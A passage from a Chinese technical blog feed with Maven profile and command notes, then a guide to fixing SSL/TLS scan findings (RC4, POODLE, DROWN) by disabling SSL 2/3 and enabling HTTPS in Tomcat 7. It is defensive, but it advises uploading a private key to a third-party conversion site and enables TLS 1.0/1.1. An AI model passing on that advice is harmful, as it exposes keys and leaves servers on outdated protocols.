            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-resources-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--使用默认的变量分割符： ${}，可以自己定义格式--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>useDefaultDelimiters</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>useDefaultDelimiters</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>多环境配置 只需要在profile定义即可</p>
<p><code>mvn clean install -Dmaven.test.skip -Denv=dev</code>  打包后 则会填充对应的的占位符，<strong>注：<code>profile</code>的优先级比全局的<code>properties</code>定义优先级要高</strong></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profiles</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>dev<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activation</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--没有指定变量默认激活--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>env<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>dev<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activation</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!--占位符定义--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>dev<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>dev<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">&gt;</span></span>
  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activation</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--没有指定变量默认激活--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>env<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activation</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!--占位符定义--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>version2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">&gt;</span></span>
  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>pro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activation</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--没有指定变量默认激活--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--maven打包的变量名和参数名字 如: mvn clean install -Dmaven.test.skip -Denv=dev--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>env<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>pro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activation</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!--占位符定义--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>pro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>version3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profiles</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>附录</h1>
<h2 id="Maven-命令一览">Maven 命令一览</h2>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>mvn artchetype:generate</td>
<td>使用交互式的方法建立工程，代替artchetype:create</td>
</tr>
<tr>
<td>mvn compile</td>
<td>编译工程</td>
</tr>
<tr>
<td>mvn clean</td>
<td>清理生成的文件，一般与package install等命令一起使用</td>
</tr>
<tr>
<td>mvn test</td>
<td>测试src/main/test下的文件</td>
</tr>
<tr>
<td>mvn package</td>
<td>生成target目录，编译、测试代码，生成测试报告，生成jar/war文件</td>
</tr>
<tr>
<td>mvn install</td>
<td>将工程打包并部署到本地库中</td>
</tr>
<tr>
<td>mvn help:effective-pom</td>
<td>实际的pom文件，显示所有的默认配置</td>
</tr>
<tr>
<td>mvn help:effective-settings</td>
<td>运行时使用setting文件</td>
</tr>
<tr>
<td>mvn eclipse:eclipse</td>
<td>生成eclipse工程文件</td>
</tr>
<tr>
<td>mvn help:describe</td>
<td>显示某个插件（目标）的功能</td>
</tr>
<tr>
<td>mvn jetty:run</td>
<td>启动jetty容器，可以在测试时代替tomcat</td>
</tr>
<tr>
<td>mvn tomcat:run</td>
<td>启动tomcat容器</td>
</tr>
<tr>
<td>mvn Debug</td>
<td>tomcat:run可以在eclipse中设置断点进行调试</td>
</tr>
<tr>
<td>mvn dependency:analyze</td>
<td>查看工程所依赖的插件，进行pom优化时可以用到</td>
</tr>
<tr>
<td>mvn dependency:sources</td>
<td>自动寻找并下载jar包的源码</td>
</tr>
<tr>
<td>mvn dependency:resolved</td>
<td>查看已经解决的依赖</td>
</tr>
<tr>
<td>mvn dependency:tree</td>
<td>查看依赖树，可以分析出间接依赖关系</td>
</tr>
<tr>
<td>mvn exec:java</td>
<td>运行指定的应用</td>
</tr>
<tr>
<td>mvn assembly:assembly</td>
<td>生成一个单独的可运行的jar包</td>
</tr>
</tbody>
</table>
<h2 id="命令行创建Maven项目">命令行创建Maven项目</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn archetype:generate <span class="token parameter variable">-DgroupId</span><span class="token operator">=</span>com.test <span class="token parameter variable">-DartifactId</span><span class="token operator">=</span>HelloWorld <span class="token parameter variable">-DarchetypeArtifactId</span><span class="token operator">=</span>maven-archetype-quickstart <span class="token parameter variable">-DinteractiveMode</span><span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>软件工具</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL漏洞处理</title>
    <url>/20221025/d188606.html</url>
    <content><![CDATA[<h2 id="一：漏洞扫描结果">一：漏洞扫描结果</h2>
<blockquote>
<ol>
<li>SSL/TLS 存在Bar Mitzvah Attack漏洞</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:left">详细描述</th>
<th>该漏洞是由功能较弱而且已经过时的RC4加密算法中一个问题所导致的。它能够在某些情况下泄露SSL/TLS加密流量中的密文，从而将账户用户名密码、信用卡数据和其他敏感信息泄露给黑客。</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">解决办法</td>
<td>1、服务器端禁止使用RC4加密算法。 2、客户端应在浏览器TLS配置中禁止RC4。</td>
</tr>
<tr>
<td style="text-align:left">威胁分值</td>
<td>5</td>
</tr>
<tr>
<td style="text-align:left">危险插件</td>
<td>否</td>
</tr>
<tr>
<td style="text-align:left">发现日期</td>
<td>2015-03-29</td>
</tr>
<tr>
<td style="text-align:left">CVE编号</td>
<td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2808">CVE-2015-2808</a></td>
</tr>
<tr>
<td style="text-align:left">BUGTRAQ</td>
<td><a href="http://www.securityfocus.com/bid/73684">73684</a></td>
</tr>
<tr>
<td style="text-align:left">NSFOCUS</td>
<td><a href="http://www.nsfocus.net/vulndb/30491">30491</a></td>
</tr>
<tr>
<td style="text-align:left">CNNVD编号</td>
<td><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201503-654">CNNVD-201503-654</a></td>
</tr>
<tr>
<td style="text-align:left">CNCVE编号</td>
<td>CNCVE-20152808</td>
</tr>
<tr>
<td style="text-align:left">CNVD编号</td>
<td><a href="http://www.cnvd.org.cn/flaw/show/CNVD-2015-02171">CNVD-2015-02171</a></td>
</tr>
<tr>
<td style="text-align:left">CVSS评分</td>
<td>5.3(CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)</td>
</tr>
</tbody>
</table>
<ol start="2">
<li>SLv3 存在严重设计缺陷漏洞 (CVE-2014-3566)</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:left">详细描述</th>
<th>SSLv3漏洞（CVE-2014-3566），该漏洞贯穿于所有的SSLv3版本中，利用该漏洞，黑客可以通过中间人攻击等类似的方式(只要劫持到的数据加密两端均使用SSL3.0)，便可以成功获取到传输数据(例如cookies)。 针对此漏洞，需要服务器端和客户端均停用SSLv3协议。</th>
</tr>
</thead>
</table>
</blockquote>
<h2 id="二：说明">二：说明</h2>
<hr>
<p>首先说明一下，SSL 2 和 SSL 3 协议是两种过时的协议，原因是它们存在很严重的漏洞，所以我们要在服务端禁用 SSL 2 和 SSL 3 协议，以避免一些安全问题。</p>
<ul>
<li>SSL 2 协议：漏洞名为 DROWN（溺水攻击 / 溺亡攻击）。DROWN 漏洞可以利用过时的 SSL 2 协议来解密与之共享相同 RSA 私钥的 TLS 协议所保护的流量。</li>
<li>SSL 3 协议：漏洞名为 POODLE（卷毛狗攻击）。POODLE 漏洞只对 CBC 模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者窃取采用 SSL 3 版加密通信过程中的内容，对填充字节修改并且利用预置填充来恢复加密内容，以达到攻击目的。</li>
</ul>
<p>关于更多基于 SSL/TLS 协议的漏洞，请查看这篇文章《<a href="https://www.123si.org/os/article/several-common-ssl-tls-vulnerabilities-and-attacks/">常见的几种 SSL/TLS 漏洞及攻击方式</a>》。</p>
<p>在 Windows 系统中，服务器如果使用 Windows Server 2016 版本系统，那么恭喜你了，你可以省去禁用 SSL 2 和 SSL 3 协议的工作了，因为在此版本系统以后，微软已经默认禁用这两种协议了。如果你还不放心，下面有 SSL 服务器测试能帮你检测。其它版本系统，可参照下文介绍的 2 种设置方法来禁用协议。</p>
<h2 id="三：SSL-服务器测试">三：SSL 服务器测试</h2>
<hr>
<p>使用下面两个测试网站，可以查看你的网站的安全状态。</p>
<ul>
<li>SSL Labs 网址：<a href="https://www.ssllabs.com/ssltest/index.html">https://www.ssllabs.com/ssltest/index.html</a></li>
<li>My SSL 网址：<a href="https://myssl.com/">https://myssl.com/</a></li>
</ul>
<h2 id="四：处理">四：处理</h2>
<h3 id="方法一：-禁用-SSL-2-和-SSL-3-协议">方法一： 禁用 SSL 2 和 SSL 3 协议</h3>
<hr>
<h4 id="1、通过修改注册表禁用协议">1、通过修改注册表禁用协议</h4>
<ol>
<li>
<p><code>Win + R</code> 键，打开运行，输入 regedit ，打开“注册表编辑器”。</p>
</li>
<li>
<p>在注册表编辑器，找到以下注册表项/文件夹：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols</code></p>
</li>
<li>
<p>在“SSL 2.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。然后重命名文件夹为“Server”。</p>
</li>
<li>
<p>右键点击“Sever”文件夹，选择“新建”，然后单击“DWORD（32-bit）值”。</p>
</li>
<li>
<p>将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。</p>
</li>
<li>
<p>请确保它显示 0x00000000（0）。如果没有，请右键单击并选择修改，输入 0 作为数值数据。</p>
</li>
<li>
<p>现在，禁用 SSL 3，对“SSL 3.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。命名新的文件夹为“Server”。</p>
</li>
<li>
<p>右键点击“Sever”文件夹，选择“新建”，然后单击 DWORD（32-bit）值。</p>
</li>
<li>
<p>将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。</p>
</li>
<li>
<p>请确保它显示 0x00000000（0）的数据列下。如果没有，请右键单击并选择修改，输入 0 作为数值数据。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/123si-org-img-1550666306359-16498366977241.jpg" alt="通过修改注册表禁用协议"></p>
</li>
<li>
<p>重新启动计算机。</p>
</li>
</ol>
<h4 id="2、使用-IIS-Crypto-工具">2、使用 IIS Crypto 工具</h4>
<p>IIS Crypto 是一个免费工具，使管理员能够在 Windows Server 2008，2012，2016 和 2019 上启用或禁用协议，密码，哈希和密钥交换算法。它还允许您重新排序 IIS 提供的 SSL / TLS 密码套件，更改高级设置，只需单击即可实施最佳实践，创建自定义模板并测试您的网站。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/123si-org-img-1550668068846-16498366977253.jpg" alt="IIS Crypto 工具"></p>
<p>使用这个工具，设置简单方便，功能也多，懒人必备啊。这个工具需要安装到服务器，并且需要管理员权限。</p>
<p><em>IIS Crypto 工具网址：<a href="https://www.nartac.com/Products/IISCrypto/">https://www.nartac.com/Products/IISCrypto/</a></em></p>
<p><em>参考文献：微软文档：<a href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/protocols-in-tls-ssl--schannel-ssp-">Protocols in TLS/SSL (Schannel SSP) - Windows applications</a></em></p>
<h3 id="方法二：-开启Tomcat7的HTTPS访问">方法二： 开启Tomcat7的HTTPS访问</h3>
<p>在方法一策略实施之后，扫描结果 SSL3.0 依然支持访问，也就意味着漏洞扫描结果依然存在，决定开启Tomcat7 的 https 访问方式。</p>
<p><em>参考文献： <a href="https://blog.csdn.net/pang_ping/article/details/80604585">CA证书服务配置Tomcat</a>、<a href="https://www.cnblogs.com/bojuetech/p/6209657.html">Tomcat7下对HTTPS的部署配置</a></em></p>
<h4 id="一、什么是CA证书，可以用来做什么，为啥大家都爱用？">一、什么是CA证书，可以用来做什么，为啥大家都爱用？</h4>
<p>​	云盾证书服务（Alibaba Cloud Certificates Service）是阿里云联合多家国内外知名 CA 证书厂商，在阿里云平台上直接提供服务器数字证书，阿里云用户可以在云平台上直接购买、甚至免费获取所需类型的数字证书，并一键部署在阿里云产品中，以最小的成本实现将所持服务从 HTTP 转换成 HTTPS。</p>
<p>​	其实按照个人理解简化说的话，CA可以帮助我们从HTTP转化为HTTPS，保证了中间传输数据的安全性。至于大家为啥都爱用，主要有两点：安全性和强制性。</p>
<p>​	安全性我们都知道，相比起HTTPS协议来说，HTTP协议是以明文方式发送内容，不提供任何方式的数据加密，如果攻击者拦截了Web浏览器和服务器之间的传输报文，便能直接知道里面的信息，因此http不适合传输一些含有敏感信息，例如：卡号、密码等。为了解决HTTP协议的这个缺陷，所以另一个协议就诞生了：安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP基础上面增加了SSL协议，SSL协议依靠证书来验证服务器的身份，并且为浏览器和服务器之间的通信加密，所以比起HTTP更多人用HTTPS的其中之一原因就是这样来的。</p>
<h4 id="二、如何申请CA证书服务（用户提供，跳过）">二、如何申请CA证书服务（用户提供，跳过）</h4>
<ol>
<li>
<p>进入控制台选择CA证书服务</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70.png" alt="img"></p>
</li>
<li>
<p>点击购买证书</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-16498375346979.png" alt="img"></p>
</li>
<li>
<p>选择，我这里是选择免费的，所以我会点击一个域名，品牌使用Symantec，然后就会有一个免费型的DV出来，如果自己测试想要免费的话跟着我来就可以用了。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983754971512.png" alt="img"></p>
</li>
<li>
<p>点击立即购买</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983759067215.png" alt="img"></p>
</li>
<li>
<p>选择支付</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983760383818.png" alt="img"></p>
</li>
<li>
<p>进入证书控制台</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983761975221.png" alt="img"></p>
</li>
<li>
<p>购买成功后会有一条记录，我们选择补全</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983763141024.png" alt="img"></p>
</li>
<li>
<p>输入你的域名</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983764712027.png" alt="img"></p>
</li>
<li>
<p>填入你的相关信息（建议：个人建议域名验证类型使用DNS不要选择文件，选择系统生成的CSR，由于小编自己的域名是买的腾讯云的，服务器是阿里的所以我就不点击证书绑定的域名了，如果服务器和域名都在阿里的话可以点击）然后下一步。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983766359730.png" alt="img"></p>
</li>
<li>
<p>提交审核，审核时间一天内就可以了</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983767884933.png" alt="img"></p>
</li>
</ol>
<h4 id="三、CA证书服务配置Tomcat">三、CA证书服务配置Tomcat</h4>
<h5 id="准备证书文件">准备证书文件</h5>
<h6 id="自己拥有的证书（未参考，跳过）">自己拥有的证书（未参考，跳过）</h6>
<ul>
<li>
<p>选择审核通过的证书进行下载</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983854427836.png" alt="img"></p>
</li>
<li>
<p>我这里选择的是Tomcat，你们可以自行选择，下载压缩包</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983855342039.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983857428142.png" alt="img"></p>
</li>
<li>
<p>选择PFX格式的到Tomcat进行相关配置，跟着我上面操作的可以直接跳到第二步，完整信息配置需要记下，后面配置需要</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983859275545.png" alt="img"></p>
</li>
</ul>
<h6 id="用户提供证书，转PFX格式">用户提供证书，转PFX格式</h6>
<ul>
<li>
<p>用户提供证书文件列表</p>
<ul>
<li>XXXXX.pem</li>
<li>XXXXX.key</li>
</ul>
</li>
<li>
<p>注册网站：<a href="https://app.certbase.com">https://app.certbase.com</a>，利用证书工具将证书<code>.PEM</code>格式转换为<code>.pfx</code>格式</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220413162330755.png" alt="image-20220413162330755"></p>
</li>
<li>
<p>转换并下载，获得文件列表</p>
<ul>
<li>XXXXX.pfx</li>
<li>password.txt （保存的是页面设置PFX密码）</li>
</ul>
</li>
</ul>
<h5 id="Tomcat配置证书">Tomcat配置证书</h5>
<ol>
<li>
<p>将下载好的压缩包解压之后将所有的文件都放到<code>tomcat</code>目录下创建的<code>cert</code>目录中（目录名称自定义）</p>
</li>
<li>
<p>点开server.xml文件, 添加配置</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>443<span class="token punctuation">"</span></span>
		<span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.coyote.http11.Http11Protocol<span class="token punctuation">"</span></span>
		<span class="token attr-name">SSLEnabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
		<span class="token attr-name">scheme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https<span class="token punctuation">"</span></span>
		<span class="token attr-name">secure</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
		<span class="token attr-name">keystoreType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PKCS12<span class="token punctuation">"</span></span>
        <span class="token attr-name">keystoreFile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PFX所在地的完整路径<span class="token punctuation">"</span></span>
        <span class="token attr-name">keystorePass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password.txt中的文本内容<span class="token punctuation">"</span></span>
		<span class="token attr-name">clientAuth</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span>
		<span class="token attr-name">SSLProtocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TLSv1+TLSv1.1+TLSv1.2<span class="token punctuation">"</span></span>
           <span class="token attr-name">ciphers</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说明：</p>
<table>
<thead>
<tr>
<th>配置文件参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>clientAuth</td>
<td>如果设为true，表示Tomcat要求所有的SSL客户出示安全证书，对SSL客户进行身份验证</td>
</tr>
<tr>
<td>keystoreFile</td>
<td>指定keystore文件的存放位置，可以指定绝对路径，也可以指定相对于&lt;catalina_home&gt; （Tomcat安装目录）环境变量的相对路径。<br>如果此项没有设定，默认情况下，Tomcat将从当前操作系统用户的用户目录下读取名为 “.keystore”的文件。</td>
</tr>
<tr>
<td>keystorePass</td>
<td>密钥库密码，指定keystore的密码。（如果申请证书时有填写私钥密码，密钥库密码即私钥密码）</td>
</tr>
<tr>
<td>SSLProtocol</td>
<td>指定套接字（Socket）使用的加密/解密协议，默认值为TLS</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>http自动跳转https的安全配置（）</p>
<p>到conf目录下的web.xml。在<code>&lt;/welcome-file-list&gt;</code>后面，<code>&lt;/web-app&gt;</code>，也就是倒数第二段里，加上这样一段</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security-constraint</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-resource-collection</span> <span class="token punctuation">&gt;</span></span>
